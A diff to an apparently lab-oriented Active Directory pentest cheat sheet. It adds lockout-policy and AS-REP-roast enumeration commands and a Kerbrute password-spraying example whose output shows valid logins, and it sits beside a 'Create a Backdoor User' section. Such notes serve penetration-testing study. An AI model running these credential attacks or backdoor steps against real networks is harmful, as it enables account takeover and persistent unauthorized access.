@@ -56,6 +56,7 @@ There are several key pieces of information we should always obtain:
 > (Get-PSReadlineOption).HistorySavePath
 # We can obtain the IP address and port number of applications running on servers integrated with AD by simply enumerating all SPNs in the domain, meaning we don't need to run a broad port scan.
 > setspn -L iis_service # or any server,client you discover
+> net accounts # Obtain the account policy, lockout threshold
 ```
 
 ### PowerView.ps1
@@ -100,9 +101,11 @@ powershell -ep bypass
 # Find out if you have admin privileges on any computers in the domain
 > Find-LocalAdminAccess # May take a few minutes
 # See who's logged in & other info
-> Get-NetSession -ComputerName files04 -Verbose # Untrustable on Windows 11
+> Get-NetSession -ComputerName web04 -Verbose # Untrustable on Windows 11
 # We can obtain the IP address and port number of applications running on servers integrated with AD by simply enumerating all SPNs in the domain, meaning we don't need to run a broad port scan
 > Get-NetUser -SPN | select samaccountname,serviceprincipalname
+# See if we can perform an AS-REP Roast on any users
+> Get-NetUser -PreauthNotRequired
 # Attempt to resolve SPN's IP
 > nslookup.exe web04.corp.com # Typically located in C:\Tools\
 # Enumerate ACEs, filtering on an identity
@@ -238,6 +241,30 @@ dir /s/b file.txt
 Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
 ```
 
+#### Kerbrute Password Spraying
+
+```bash
+PS C:\Tools> type .\usernames.txt
+pete
+dave
+jen
+
+PS C:\Tools> .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
+
+    __             __               __
+   / /_____  _____/ /_  _______  __/ /____
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
+
+Version: v1.0.3 (9dad6e1) - 09/06/22 - Ronnie Flathers @ropnop
+
+2022/09/06 20:30:48 >  Using KDC(s):
+2022/09/06 20:30:48 >   dc1.corp.com:88
+2022/09/06 20:30:48 >  [+] VALID LOGIN:  jen@corp.com:Nexus123!
+2022/09/06 20:30:48 >  [+] VALID LOGIN:  pete@corp.com:Nexus123!
+2022/09/06 20:30:48 >  Done! Tested 3 logins (2 successes) in 0.041 seconds
+```
 #### Create a Backdoor User
 
 You can use this user to RDP into a session and obtain a GUI. This assumes that you are already NT Authority.
